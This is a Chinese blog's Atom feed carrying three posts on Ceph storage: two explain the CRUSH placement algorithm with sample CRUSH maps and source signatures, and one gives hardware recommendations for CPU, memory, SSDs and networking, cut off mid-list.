<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2017-06-06T09:38:00.092Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ceph-crush algorithm(二)</title>
    <link href="https://t1ger.github.io/2017/06/06/ceph-crush%20algorithm(%E4%BA%8C)/"/>
    <id>https://t1ger.github.io/2017/06/06/ceph-crush algorithm(二)/</id>
    <published>2017-06-06T08:23:40.000Z</published>
    <updated>2017-06-06T09:38:00.092Z</updated>
    
    <content type="html"><![CDATA[<h5 id="源码文件"><a href="#源码文件" class="headerlink" title="源码文件"></a><b>源码文件</b></h5><p>crush目录下的源码文件如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">CrushCompiler.cc	</div><div class="line">CrushCompiler.h	</div><div class="line">CrushLocation.cc	</div><div class="line">CrushLocation.h	</div><div class="line">CrushTester.cc	</div><div class="line">CrushTester.h	</div><div class="line">CrushTreeDumper.h	</div><div class="line">CrushWrapper.cc	</div><div class="line">CrushWrapper.h	</div><div class="line">CrushWrapper.i	</div><div class="line">builder.c	</div><div class="line">builder.h	</div><div class="line">crush.c	</div><div class="line">crush.h	</div><div class="line">crush_compat.h	</div><div class="line">crush_ln_table.h	</div><div class="line">grammar.h	</div><div class="line">hash.c	</div><div class="line">hash.h	</div><div class="line">mapper.c	</div><div class="line">mapper.h	</div><div class="line">old_sample.txt	</div><div class="line">sample.txt	</div><div class="line">types.h</div></pre></td></tr></table></figure></p>
<h5 id="CRUSH-maps"><a href="#CRUSH-maps" class="headerlink" title="CRUSH maps"></a><b>CRUSH maps</b></h5><p>crush maps组成: osd list,Bucket list ,rule list</p>
<p>Device<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">device 0 osd.0</div><div class="line">device 1 osd.1</div><div class="line">device 2 osd.2</div><div class="line">device 3 osd.3</div><div class="line">device 4 osd.4</div><div class="line">device 5 osd.5</div><div class="line">device 6 osd.6</div><div class="line">device 7 osd.7</div></pre></td></tr></table></figure></p>
<p>Bucket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">host ceph-osd-ssd-server-1 &#123;</div><div class="line">           id -1</div><div class="line">           alg straw</div><div class="line">           hash 0</div><div class="line">           item osd.0 weight 1.00</div><div class="line">           item osd.1 weight 1.00</div><div class="line">   &#125;</div><div class="line">   host ceph-osd-ssd-server-2 &#123;</div><div class="line">           id -2</div><div class="line">           alg straw</div><div class="line">           hash 0</div><div class="line">           item osd.2 weight 1.00</div><div class="line">           item osd.3 weight 1.00</div><div class="line">   &#125;</div><div class="line">  host ceph-osd-platter-server-1 &#123;</div><div class="line">           id -3</div><div class="line">           alg straw</div><div class="line">           hash 0</div><div class="line">           item osd.4 weight 1.00</div><div class="line">           item osd.5 weight 1.00</div><div class="line">   &#125;</div><div class="line">   host ceph-osd-platter-server-2 &#123;</div><div class="line">           id -4</div><div class="line">           alg straw</div><div class="line">           hash 0</div><div class="line">           item osd.6 weight 1.00</div><div class="line">           item osd.7 weight 1.00</div><div class="line">   &#125;</div><div class="line">   root platter &#123;</div><div class="line">           id -5</div><div class="line">           alg straw</div><div class="line">           hash 0</div><div class="line">           item ceph-osd-platter-server-1 weight 2.00</div><div class="line">           item ceph-osd-platter-server-2 weight 2.00</div><div class="line">   &#125;</div><div class="line">   root ssd &#123;</div><div class="line">           id -6</div><div class="line">           alg straw</div><div class="line">           hash 0</div><div class="line">           item ceph-osd-ssd-server-1 weight 2.00</div><div class="line">           item ceph-osd-ssd-server-2 weight 2.00</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
<p>Rule<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">rule data &#123;</div><div class="line">              ruleset 0</div><div class="line">              type replicated</div><div class="line">              min_size 2</div><div class="line">              max_size 2</div><div class="line">              step take platter</div><div class="line">              step chooseleaf firstn 0 type host</div><div class="line">              step emit</div><div class="line">      &#125;</div><div class="line">      rule metadata &#123;</div><div class="line">              ruleset 1</div><div class="line">              type replicated</div><div class="line">              min_size 0</div><div class="line">              max_size 10</div><div class="line">              step take platter</div><div class="line">              step chooseleaf firstn 0 type host</div><div class="line">              step emit</div><div class="line">      &#125;</div><div class="line">      rule rbd &#123;</div><div class="line">              ruleset 2</div><div class="line">              type replicated</div><div class="line">              min_size 0</div><div class="line">              max_size 10</div><div class="line">              step take platter</div><div class="line">              step chooseleaf firstn 0 type host</div><div class="line">              step emit</div><div class="line">      &#125;</div><div class="line">      rule platter &#123;</div><div class="line">              ruleset 3</div><div class="line">              type replicated</div><div class="line">              min_size 0</div><div class="line">              max_size 10</div><div class="line">              step take platter</div><div class="line">              step chooseleaf firstn 0 type host</div><div class="line">              step emit</div><div class="line">      &#125;</div><div class="line">      rule ssd &#123;</div><div class="line">              ruleset 4</div><div class="line">              type replicated</div><div class="line">              min_size 0</div><div class="line">              max_size 4</div><div class="line">              step take ssd</div><div class="line">              step chooseleaf firstn 0 type host</div><div class="line">              step emit</div><div class="line">      &#125;</div><div class="line">      rule ssd-primary &#123;</div><div class="line">              ruleset 5</div><div class="line">              type replicated</div><div class="line">              min_size 5</div><div class="line">              max_size 10</div><div class="line">              step take ssd</div><div class="line">              step chooseleaf firstn 1 type host</div><div class="line">              step emit</div><div class="line">              step take platter</div><div class="line">              step chooseleaf firstn -1 type host</div><div class="line">              step emit</div><div class="line">      &#125;</div></pre></td></tr></table></figure></p>
<h5 id="Do-Rule"><a href="#Do-Rule" class="headerlink" title="Do Rule"></a><b>Do Rule</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void do_rule(int rule, int x, vector&lt;int&gt;&amp; out, int maxout,</div><div class="line">	       const WeightVector&amp; weight,</div><div class="line">	       uint64_t choose_args_index) const &#123;</div><div class="line">    int rawout[maxout];</div><div class="line">    char work[crush_work_size(crush, maxout)];</div><div class="line">    crush_init_workspace(crush, work);</div><div class="line">    crush_choose_arg_map arg_map = choose_args_get(choose_args_index);</div><div class="line">    int numrep = crush_do_rule(crush, rule, x, rawout, maxout, &amp;weight[0],</div><div class="line">			       weight.size(), work, arg_map.args);</div></pre></td></tr></table></figure>
<p>@rule: 使用的crush_rule在crush_map的rules列表中所在index<br>@x: 输入Hash ID，object_id或者pg_id)<br>@out: 输出Device ID列表<br>@maxout: 在输出Device ID的个数，副本的个数<br>@weight: 输出Device列表对应的权重</p>
<p>具体工作调用crush_do_rule完成</p>
<p>Mapper.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * crush_do_rule - calculate a mapping with the given input and rule</div><div class="line"> * @map: the crush_map</div><div class="line"> * @ruleno: the rule id</div><div class="line"> * @x: hash input</div><div class="line"> * @result: pointer to result vector</div><div class="line"> * @result_max: maximum result size</div><div class="line"> * @weight: weight vector (for map leaves)</div><div class="line"> * @weight_max: size of weight vector</div><div class="line"> * @cwin: Pointer to at least map-&gt;working_size bytes of memory or NULL.</div><div class="line"> */</div><div class="line">int crush_do_rule(const struct crush_map *map,</div><div class="line">		  int ruleno, int x, int *result, int result_max,</div><div class="line">		  const __u32 *weight, int weight_max,</div><div class="line">		  void *cwin, const struct crush_choose_arg *choose_args)</div></pre></td></tr></table></figure></p>
<p>值得说的变量emit 通常用在规则的结束,同时可以被用在在形相同规则下选择不同的树.更多详细信息看<a href="http://docs.ceph.com/docs/master/rados/operations/crush-map/#crush-map-rules" target="_blank" rel="external">这里</a></p>
<p>ref<br><a href="http://www.shalandis.com/original/2016/05/19/CEPH-CRUSH-algorithm-source-code-analysis/" target="_blank" rel="external">CEPH CRUSH algorithm source code analysis</a><br><a href="http://way4ever.com/?p=123" target="_blank" rel="external">ceph的CRUSH算法的源码分析</a><br><a href="http://www.xuxiaopang.com/2016/11/08/easy-ceph-CRUSH/" target="_blank" rel="external">大话Ceph–CRUSH那点事儿</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;源码文件&quot;&gt;&lt;a href=&quot;#源码文件&quot; class=&quot;headerlink&quot; title=&quot;源码文件&quot;&gt;&lt;/a&gt;&lt;b&gt;源码文件&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;crush目录下的源码文件如下:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;ta
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ceph-crush algorithm(一)</title>
    <link href="https://t1ger.github.io/2017/06/02/ceph-crush%20algorithm(%E4%B8%80)/"/>
    <id>https://t1ger.github.io/2017/06/02/ceph-crush algorithm(一)/</id>
    <published>2017-06-02T10:28:17.000Z</published>
    <updated>2017-06-06T09:37:53.304Z</updated>
    
    <content type="html"><![CDATA[<h5 id="CRUSH简介"><a href="#CRUSH简介" class="headerlink" title="CRUSH简介"></a><b>CRUSH简介</b></h5><p>CRUSH是ceph的一个模块，主要解决可控、可扩展、去中心化的数据副本分布问题.<br>CRUSH全称Controlled Replication Under Scalable Hashing，是一种数据分发算法，类似于哈希和一致性哈希。<br>哈希的问题在于数据增长时不能动态加Bucket，一致性哈希的问题在于加Bucket时数据迁移量比较大，<br>其他数据分发算法依赖中心的Metadata服务器来存储元数据效率较低，CRUSH则是通过计算、接受多维参数的来解决动态数据分发的场景</p>
<p>CRUSH实现了一种伪随机数据分布算法，它能够在层级结构的存储集群中有效的分布对象的副本,它的参数是object id或object group id，并返回一组存储设备(用于保存object副本)<br>CRUSH需要cluster map(描述存储集群的层级结构)、和副本分布策略(rule)</p>
<h5 id="算法基础"><a href="#算法基础" class="headerlink" title="算法基础"></a><b>算法基础</b></h5><p>在学习CRUSH之前，需要了解以下的内容。<br>CRUSH算法通过每个设备的权重来计算数据对象的分布。对象分布是由cluster map和data distribution policy决定的。<br>cluster map描述了可用存储资源和层级结构(比如有多少个机架，每个机架上有多少个服务器，每个服务器上有多少个磁盘)。<br>data distribution policy由placement rules组成。rule决定了每个数据对象有多少个副本，这些副本存储的限制条件(比如3个副本放在不同的机架中)。<br>每个rule就是一系列操作，take操作就是就是选一个bucket，select操作就是选择n个类型是t的项，emit操作就是提交最后的返回结果。<br>select要考虑的东西主要包括是否冲突、是否有失败和负载问题.</p>
<p>CRUSH算法还通过输入一个整数x，输出则是一个包含n个目标的列表R，例如三备份的话输出可能是[1, 3, 5]。<br>(osd0, osd1, osd2 … osdn) = CRUSH(x)<br>CRUSH利用多参数HASH函数，HASH函数中的参数包括x，使得从x到OSD集合是确定性的和独立的。<br>CRUSH只使用了cluster map、placement rules、x。CRUSH是伪随机算法，相似输入的结果之间没有相关性。</p>
<ul>
<li><p>Cluster map<br>Cluster map由device和bucket组成，它们都有id和权重值。Bucket可以包含任意数量item。item可以都是的devices或者都是buckets。<br>管理员控制存储设备的权重。权重和存储设备的容量有关。Bucket的权重被定义为它所包含所有item的权重之和。<br>CRUSH基于4种不同的bucket type，每种有不同的选择算法。</p>
</li>
<li><p>副本分布<br>副本在存储设备上的分布影响数据的安全。cluster map反应了存储系统的物理结构。CRUSH placement policies决定把对象副本分布在不同的区域(某个区域发生故障时并不会影响其他区域)。每个rule包含一系列操作(用在层级结构上)<br>这些操作包括：<br>1.take(a) ：选择一个item，一般是bucket，并返回bucket所包含的所有item。这些item是后续操作的参数，这些item组成向量i。<br>2.select(n, t)：迭代操作每个item(向量i中的item)，对于每个item(向量i中的item)向下遍历(遍历这个item所包含的item)，都返回n个不同的item(type为t的item)，并把这些item都放到向量i中。select函数会调用c(r, x)函数，这个函数会在每个bucket中伪随机选择一个item。<br>3.emit：把向量i放到result中。</p>
<p>存储设备有一个确定的类型。每个bucket都有type属性值，用于区分不同的bucket类型(比如”row”、”rack”、”host”等，type可以自定义)。rules可以包含多个take和emit语句块，这样就允许从不同的存储池中选择副本的storage target</p>
</li>
<li><p>冲突、故障、超载<br>select(n, t)操作会循环选择第 r=1,…,n 个副本，r作为选择参数。在这个过程中，假如选择到的item遇到三种情况(冲突，故障，超载)时，CRUSH会拒绝选择这个item，并使用r’(r’和r、出错次数、firstn参数有关)作为选择参数重新选择item。<br>1.冲突：这个item已经在向量i中，已被选择。<br>2.故障：设备发生故障，不能被选择。<br>3.超载：设备使用容量超过警戒线，没有剩余空间保存数据对象。<br>故障设备和超载设备会在cluster map上标记(还留在系统中)，这样避免了不必要的数据迁移。</p>
</li>
<li><p>MAP改变和数据迁移<br>当添加移除存储设备，或有存储设备发生故障时(cluster map发生改变时)，存储系统中的数据会发生迁移。好的数据分布算法可以最小化数据迁移大小。</p>
</li>
</ul>
<h5 id="CRUSH总结"><a href="#CRUSH总结" class="headerlink" title="CRUSH总结"></a><b>CRUSH总结</b></h5><ul>
<li><p>算法总结<br>CRUSH与一致性哈希最大的区别在于接受的参数多了cluster map和placement rules，这样就可以根据目前cluster的状态动态调整数据位置，同时通过算法得到一致的结果</p>
</li>
<li><p>算法补充<br>前面介绍了bucket根据不同场景有四种类型，分别是Uniform、List、Tree和Straw，他们对应运行数据和数据迁移量有不同的tradeoff，目前大家都在用Straw因此不太需要关注其他。<br>目前erasing code可以大大减小三备份的数据量，但除了会导致数据恢复慢，部分ceph支持的功能也是不能直接用的，而且功能仍在开发中不建议使用。</p>
<p>  有兴趣的读者可以拜读下Sega本人的博士论文作品:<br>长论文包含了RADOS、CRUSH等所有内容的介绍，但篇幅相当长，如果感兴趣可以阅读，标题为《CEPH: RELIABLE, SCALABLE, AND HIGH-PERFORMANCE DISTRIBUTED STORAGE》，地址 <a href="http://ceph.com/papers/weil-thesis.pdf" target="_blank" rel="external">http://ceph.com/papers/weil-thesis.pdf</a> </p>
<p>  CRUSH论文标题为《CRUSH: Controlled, Scalable, Decentralized Placement of Replicated Data》，地址 <a href="http://ceph.com/papers/weil-crush-sc06.pdf" target="_blank" rel="external">http://ceph.com/papers/weil-crush-sc06.pdf</a> ，介绍了CRUSH的设计与实现细节</p>
<p>  RADOS沦为标题为《RADOS: A Scalable, Reliable Storage Service for Petabyte-scale Storage Clusters》，地址为 <a href="http://ceph.com/papers/weil-rados-pdsw07.pdf" target="_blank" rel="external">http://ceph.com/papers/weil-rados-pdsw07.pdf</a> ，介绍了RADOS的设计与实现细节</p>
<p>  CephFS论文标题为《Ceph: A Scalable, High-Performance Distributed File System》，地址为 <a href="http://ceph.com/papers/weil-ceph-osdi06.pdf" target="_blank" rel="external">http://ceph.com/papers/weil-ceph-osdi06.pdf</a> ，介绍了Ceph的基本架构和Ceph的设计与实现细节</p>
</li>
</ul>
<p>ref<br><a href="http://way4ever.com/?p=122" target="_blank" rel="external">ceph的CRUSH数据分布算法介绍</a><br><a href="https://tobegit3hub1.gitbooks.io/ceph_from_scratch/content/architecture/crush.html" target="_blank" rel="external">CRUSH详解</a><br><a href="http://www.xuxiaopang.com/2016/11/08/easy-ceph-CRUSH/" target="_blank" rel="external">大话Ceph–CRUSH那点事儿</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;CRUSH简介&quot;&gt;&lt;a href=&quot;#CRUSH简介&quot; class=&quot;headerlink&quot; title=&quot;CRUSH简介&quot;&gt;&lt;/a&gt;&lt;b&gt;CRUSH简介&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;CRUSH是ceph的一个模块，主要解决可控、可扩展、去中心化的数据副本分布问题.&lt;b
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ceph硬件推荐</title>
    <link href="https://t1ger.github.io/2017/06/01/ceph%E7%A1%AC%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <id>https://t1ger.github.io/2017/06/01/ceph硬件推荐/</id>
    <published>2017-06-01T11:41:45.000Z</published>
    <updated>2017-06-02T05:42:40.066Z</updated>
    
    <content type="html"><![CDATA[<h4 id="cpu和内存"><a href="#cpu和内存" class="headerlink" title="cpu和内存"></a><b>cpu和内存</b></h4><ul>
<li>CPU<br>metadata servers：属于CPU敏感型的角色服务器<br>OSDs：负责运行RADOS service，使用CRUSH算法计算数据分布，复制数据，并维护它们自己的拷贝，所以CPU也需要较好的<br>Monitors：监控服务器芝士简单的维护一份集群mapping的主拷贝，所以并非是CPU敏感的</li>
<li>内存<br>metadata servers和monitors需要快速响应它们存储的数据，所以它们需要不少的内存<br>每个daemon实例最少1GB<br>OSDs不需要太多的内存做日常的操作，500MB即可，但是在recovery阶段<br>每1TB的存储，需要消耗约1GB的内存，所以说，内存是越多越好</li>
</ul>
<h4 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a><b>硬盘</b></h4><p>这里说下固态盘</p>
<ul>
<li>固态硬盘: SSD 和硬盘相比每 GB 成本通常要高 10 倍以上，但访问时间至少比硬盘快 100 倍.SSD 没有可移动机械部件，所以不存在和硬盘一样的局限性。但 SSD 也有局限性，评估SSD 时，顺序读写性能很重要，在为多个 OSD 存储日志时，有着 400MB/s 顺序读写吞吐量的 SSD 其性能远高于 120MB/s 的.<br>备注:我们建议发掘 SSD 的用法来提升性能。然而在大量投入 SSD 前，我们强烈建议核实 SSD 的性能指标，并在测试环境下衡量性能<br>可接受的 IOPS 指标对选择用于 Ceph 的 SSD 还不够，用于日志和 SSD 时还有几个重要考量：<br>写密集语义： 记日志涉及写密集语义，所以你要确保选用的 SSD 写入性能和硬盘相当或好于硬盘。廉价 SSD 可能在加速访问的同时引入写延时，有时候高性能硬盘的写入速度可以和便宜 SSD 相媲美<br>顺序写入： 在一个 SSD 上为多个 OSD 存储多个日志时也必须考虑 SSD 的顺序写入极限，因为它们要同时处理多个 OSD 日志的写入请求。<br>分区对齐： 采用了 SSD 的一个常见问题是人们喜欢分区，却常常忽略了分区对齐，这会导致 SSD 的数据传输速率慢很多，所以请确保分区对齐了</li>
<li>其他注意事项<br>你可以在同一主机上运行多个 OSD ，但要确保 OSD 硬盘总吞吐量不超过为客户端提供读写服务所需的网络带宽；还要考虑集群在每台主机上所存储的数据占总体的百分比，如果一台主机所占百分比太大而它挂了，就可能导致诸如超过 full ratio 的问题，此问题会使 Ceph 中止运作以防数据丢失。<br>如果每台主机运行多个 OSD ，也得保证内核是最新的。参阅<a href="http://docs.ceph.org.cn/start/os-recommendations/" target="_blank" rel="external">操作系统推荐</a>里关于 glibc 和 syncfs(2) 的部分，确保硬件性能可达期望值。<br>OSD 数量较多（如 20 个以上）的主机会派生出大量线程，尤其是在恢复和重均衡期间。很多 Linux 内核默认的最大线程数较小（如 32k 个），如果您遇到了这类问题，可以把 kernel.pid_max 值调高些。理论最大值是 4194303 。例如把下列这行加入 /etc/sysctl.conf 文件：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">kernel.pid_max = 4194303</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>结论: OSDs建议最小1TB,Ceph 最佳实践指示，应该分别在单独的硬盘运行操作系统、 OSD 数据和 OSD 日志</b></p>
<h4 id="网络"><a href="#网络" class="headerlink" title="网络"></a><b>网络</b></h4><p>建议每台机器最少两个千兆网卡，现在大多数机械硬盘都能达到大概 100MB/s 的吞吐量，网卡应该能处理所有 OSD 硬盘总吞吐量，所以推荐最少两个千兆网卡，分别用于公网（前端）和集群网络（后端）。集群网络（最好别连接到国际互联网）用于处理由数据复制产生的额外负载，而且可防止拒绝服务攻击，拒绝服务攻击会干扰数据归置组，使之在 OSD 数据复制时不能回到 active + clean 状态。请考虑部署万兆网卡。通过 1Gbps 网络复制 1TB 数据耗时 3 小时，而 3TB （典型配置）需要 9 小时，相比之下，如果使用 10Gbps 复制时间可分别缩减到 20 分钟和 1 小时。在一个 PB 级集群中， OSD 磁盘失败是常态，而非异常；在性价比合理的的前提下，系统管理员想让 PG 尽快从 degraded （降级）状态恢复到 active + clean 状态。另外，一些部署工具（如 Dell 的 Crowbar ）部署了 5 个不同的网络，但使用了 VLAN 以提高网络和硬件可管理性。 VLAN 使用 802.1q 协议，还需要采用支持 VLAN 功能的网卡和交换机，增加的硬件成本可用节省的运营（网络安装、维护）成本抵消。使用 VLAN 来处理集群和计算栈（如 OpenStack 、 CloudStack 等等）之间的 VM 流量时，采用 10G 网卡仍然值得。每个网络的机架路由器到核心路由器应该有更大的带宽，如 40Gbps 到 100Gbps 。</p>
<p>服务器应配置底板管理控制器（ Baseboard Management Controller, BMC ），管理和部署工具也应该大规模使用 BMC ，所以请考虑带外网络管理的成本/效益平衡，此程序管理着 SSH 访问、 VM 映像上传、操作系统安装、端口管理、等等，会徒增网络负载。运营 3 个网络有点过分，但是每条流量路径都指示了部署一个大型数据集群前要仔细考虑的潜能力、吞吐量、性能瓶颈</p>
<p><b>结论:每台机器最少是两块前兆网卡（物理交换机也需要隔离）,最少是10Gbps在机架</b></p>
<h4 id="故障域"><a href="#故障域" class="headerlink" title="故障域"></a><b>故障域</b></h4><p>故障域指任何导致不能访问一个或多个 OSD 的故障，可以是主机上停止的进程、硬盘故障、操作系统崩溃、有问题的网卡、损坏的电源、断网、断电等等。规划硬件需求时，要在多个需求间寻求平衡点，像付出很多努力减少故障域带来的成本削减、隔离每个潜在故障域增加的成本。</p>
<h4 id="最低硬件推荐"><a href="#最低硬件推荐" class="headerlink" title="最低硬件推荐"></a><b>最低硬件推荐</b></h4><ul>
<li><p>Dell 实例: Ceph 集群项目(2012年)使用了 2 个相当强悍的 OSD 硬件配置，和稍逊的监视器配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">|Configuration	|Criteria      	|Minimum Recommended</div><div class="line">|---		|---		|---</div><div class="line">|Dell PE R510  	|Processor	|2x 64-bit quad-core Xeon CPUs</div><div class="line">|		|RAM		|16 GB</div><div class="line">|		|Volume Storage	|8x 2TB drives. 1 OS, 7 Storage</div><div class="line">|		|Client Network	|2x 1GB Ethernet NICs</div><div class="line">|		|OSD Network	|2x 1GB Ethernet NICs</div><div class="line">|		|Mgmt. Network	|2x 1GB Ethernet NICs</div><div class="line">|Dell PE R515   |Processor	|1x hex-core Opteron CPU</div><div class="line">|		|RAM		|16 GB</div><div class="line">|		|Volume Storage	|12x 3TB drives. Storage</div><div class="line">|		|OS Storage	|1x 500GB drive. Operating System.</div><div class="line">|		|Client Network	|2x 1GB Ethernet NICs</div><div class="line">|		|OSD Network	|2x 1GB Ethernet NICs</div><div class="line">|		|Mgmt. Network	|2x 1GB Ethernet NICs</div></pre></td></tr></table></figure>
</li>
<li><p>低配(RedHat提供)<br>1.osd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">|Criteria	|Minimum Recommended|</div><div class="line">|: --:		|:–		|</div><div class="line">|Processor	|1x AMD64 and Intel 64|</div><div class="line">|RAM 		|2 GB of RAM per deamon|</div><div class="line">|Volume Storage	|1x storage drive per daemon|</div><div class="line">|Journal	|1x SSD partition per daemon (optional)|</div><div class="line">|Network	|2x 1GB Ethernet NICs|</div></pre></td></tr></table></figure>
<p>  2.mon</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">| Criteria	| Minimum Recommended|</div><div class="line">| : --:		| :–		|</div><div class="line">|Processor	| 1x AMD64 and Intel 64|</div><div class="line">|RAM 		| 1 GB of RAM per deamon|</div><div class="line">|Disk Space	| 10 GB per daemon|</div><div class="line">| Network	| 2x 1GB Ethernet NICs|</div></pre></td></tr></table></figure>
</li>
<li><p>高配(Intel提供)<br>1.osd –Good</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">|Criteria	|Minimum Recommended|</div><div class="line">|: --:		|:–		|</div><div class="line">|Processor	|Inter(R) Xeon(R)CPU E5-2650v3|</div><div class="line">|RAM 		|64GB |</div><div class="line">|Volume Storage	|1x1.6TB P3700+12x4TB HDDs(1:12 ratio) P3700 as Journal and caching|</div><div class="line">|Caching software	|Intel(R) CAS3.0,option: Intel(R) RSTe/MD4.3|</div><div class="line">|Network	|10Gbe|</div></pre></td></tr></table></figure>
<p>  2.osd –Better</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">|Criteria	|Minimum Recommended|</div><div class="line">|: --:		|:–		|</div><div class="line">|Processor	|Inter(R) Xeon(R)CPU E5-2690|</div><div class="line">|RAM 		|128GB |</div><div class="line">|Volume Storage	|1xIntel(R) DC P3700(800G)+4xIntel(R) DC S3510 1.6TB|</div><div class="line">|Network	|Duel 10Gbe|</div></pre></td></tr></table></figure>
<p>  3.osd –Best</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">|Criteria	|Minimum Recommended|</div><div class="line">|: --:		|:–		|</div><div class="line">|Processor	|Inter(R) Xeon(R)CPU E5-2699v3|</div><div class="line">|RAM 		|&gt;=128GB |</div><div class="line">|Volume Storage	|4 to 6xIntel(R)DC P3700 2TB|</div><div class="line">|Network	|2x 40GbE,4xdual 10GbE|</div></pre></td></tr></table></figure>
</li>
<li><p>vpsee生产实例</p>
